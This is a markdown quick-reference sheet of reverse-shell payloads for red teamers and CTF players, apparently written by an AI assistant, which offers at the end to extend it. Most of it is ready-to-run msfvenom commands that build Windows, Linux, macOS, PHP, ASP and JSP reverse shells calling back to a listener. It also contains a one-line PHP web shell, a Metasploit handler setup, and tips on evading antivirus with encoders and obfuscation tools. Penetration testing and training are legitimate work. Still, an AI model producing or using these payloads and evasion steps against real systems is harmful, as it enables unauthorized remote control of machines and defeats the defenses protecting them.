## 📄 reverse_shell_payloads.md

## 📌 Purpose:
To help red teamers, pentesters, and CTF participants quickly create and launch reverse shells for Windows, Linux, macOS, and web servers, using Metasploit payloads and msfvenom.

### 📘 Sample Content of reverse_shell_payloads.md:

# 🎯 Reverse Shell Payloads Reference

This guide provides tested Metasploit reverse shell payloads for common platforms and how to generate them using `msfvenom`.

---

## 🪟 Windows Reverse Shell

Generate an `.exe` payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
```

```bash
Alternative encoders for AV evasion:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -f exe -o shell-obf.exe
```

## 🐧 Linux Reverse Shell

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf
```

## 🍎 macOS Reverse Shell
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f macho -o shell.macho
```

## 🌐 Web Payloads
### PHP
```bash
<?php system($_GET["cmd"]); ?>
```

### Reverse shell:
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.php
```

### ASP
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f asp > shell.asp
```

### JSP
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.jsp
```

---

## 🔌Handler Setup in Metasploit
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

---

## 🛡️ Evasion Tips
```bash
    Use -e encoder options like x86/shikata_ga_nai

    Output to .bat, .vbs, .ps1 and obfuscate
```

```bash
    Use tools like:

        Veil

        Shellter

        pyminifier for Python payloads
```



---

## 💡 Notes
```bash
    Always test payloads in a lab environment

    Use VPN/VLAN to isolate C2

    Ensure firewall/AV doesn't block your listener
```

---

## ✅ For full exploitation walkthroughs, check: examples/ms17-010_exploit.md

---



---

### 💡 Why You Need This File

- Saves time during real engagements or CTFs
- Avoids Googling the same payloads repeatedly
- Helps junior pentesters learn correct syntax
- Easily integrated into your internal wiki or printed as a quick reference

---



Let me know and I’ll generate an extended version.

